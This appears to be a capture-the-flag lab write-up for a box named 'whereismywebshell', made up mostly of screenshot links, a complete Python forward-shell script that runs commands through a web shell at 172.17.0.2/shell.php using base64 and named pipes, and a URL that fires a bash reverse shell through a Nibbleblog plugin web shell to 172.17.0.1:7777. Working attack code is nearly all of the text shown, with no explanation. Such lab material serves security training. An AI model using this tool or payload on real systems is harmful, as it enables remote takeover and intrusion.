![](images/images-whereismywebshell/Pasted%20image%2020250224112721.png)

![](images/images-whereismywebshell/Pasted%20image%2020250224113243.png)

![](images/images-whereismywebshell/Pasted%20image%2020250224113426.png)

![](images/images-whereismywebshell/Pasted%20image%2020250224113710.png)

![](images/images-whereismywebshell/Pasted%20image%2020250224113731.png)

![](images/images-whereismywebshell/Pasted%20image%2020250224114130.png)

![](images/images-whereismywebshell/Pasted%20image%2020250224115315.png)

![](images/images-whereismywebshell/Pasted%20image%2020250224115453.png)

![](images/images-whereismywebshell/Pasted%20image%2020250224120034.png)

![](images/images-whereismywebshell/Pasted%20image%2020250224162035.png)

``` python
#!/usr/bin/python3

import requests, time, threading, signal, sys
from base64 import b64encode
from random import randrange
import re

class AllTheReads(object):
    def __init__(self, interval=1):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        readoutput = """/bin/cat %s""" % (stdout)
        clearoutput = """echo '' > %s""" % (stdout)
        while True:
            output = RunCmd(readoutput)
            if output:
                RunCmd(clearoutput)
                print(output)
            time.sleep(self.interval)

def extract_pre_content(html):
    """
    Extrae el contenido dentro de las etiquetas <pre> de una respuesta HTML.
    """
    match = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
    if match:
        return match.group(1).strip()
    return ""

def RunCmd(cmd):
    """
    Ejecuta un comando remoto a través de la vulnerabilidad RCE.
    """
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')
    payload = {
        'parameter': 'echo "%s" | base64 -d | sh' % (cmd)
    }
    response = requests.get('http://172.17.0.2/shell.php', params=payload, timeout=5).text
    result = extract_pre_content(response)
    return result

def WriteCmd(cmd):
    """
    Escribe un comando en el servidor remoto.
    """
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')
    payload = {
        'parameter': 'echo "%s" | base64 -d > %s' % (cmd, stdin)
    }
    response = requests.get('http://172.17.0.2/shell.php', params=payload, timeout=5).text
    result = extract_pre_content(response)
    return result

def ReadCmd():
    """
    Lee la salida del comando ejecutado en el servidor remoto.
    """
    GetOutput = """/bin/cat %s""" % (stdout)
    output = RunCmd(GetOutput)
    return output

def SetupShell():
    """
    Configura una shell remota utilizando named pipes (fifo).
    """
    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
    try:
        RunCmd(NamedPipes)
    except:
        None
    return None

global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
erasestdin = """/bin/rm %s""" % (stdin)
erasestdout = """/bin/rm %s""" % (stdout)

SetupShell()

ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
    """
    Maneja la señal de salida (Ctrl+C) y limpia los archivos temporales.
    """
    print("\n\n[*] Exiting...\n")
    print("[*] Removing files...\n")
    RunCmd(erasestdin)
    RunCmd(erasestdout)
    print("[*] All files have been deleted\n")
    sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

def prompt_for_password():
    """
    Pide al usuario que ingrese una contraseña (en caso de su o sudo).
    """
    password = input("Password: ")
    return password

def execute_shell_command(command, password=None):
    """
    Ejecuta un comando en la shell remota, interactuando si es necesario con su o sudo.
    """
    if command.startswith("su") or command.startswith("sudo su"):
        if password:
            # Ejecutar 'su' o 'sudo su' con la contraseña proporcionada
            command = f"echo '{password}' | {command}"
    result = WriteCmd(command)
    return result

while True:
    cmd = input(">>> ")

    if cmd.startswith("su") or cmd.startswith("sudo su"):
        password = prompt_for_password()  # Pide la contraseña
        result = execute_shell_command(cmd, password)
    else:
        result = WriteCmd(cmd + "\n")
    
    if result:
        print(result)
    else:
        print("No output or empty response.")
    
    time.sleep(1.1)
```

![](images/images-whereismywebshell/Pasted%20image%2020250225163304.png)

![](images/images-whereismywebshell/Pasted%20image%2020250225175529.png)

http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash%20-i%20>%26%20/dev/tcp/172.17.0.1/7777%200>%261

![](images/images-whereismywebshell/Pasted%20image%2020250226103856.png)

![](images/images-whereismywebshell/Pasted%20image%2020250226103812.png)
